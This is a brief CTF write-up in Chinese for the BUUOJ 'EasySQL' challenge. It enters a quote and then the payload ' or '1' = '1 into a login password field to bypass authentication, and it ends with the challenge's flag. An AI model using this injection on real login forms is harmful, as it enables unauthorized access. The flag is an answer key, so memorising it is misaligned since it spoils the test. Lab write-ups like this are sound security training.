# [EasySQL](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]EasySQL)
## writeup
1. 密码处输入`'`                               
![](./img/shuchu.png)                               
2. 密码输入` ' or '1' = '1 `，相当于`sql="SELECT * FROM users WHERE name='admin' and pass='' or '1' = '1'"`                               
![](./img/ok.png)                               
3. flag:`flag{41d91001-44f4-40c7-8dd0-9ec611f64e24}`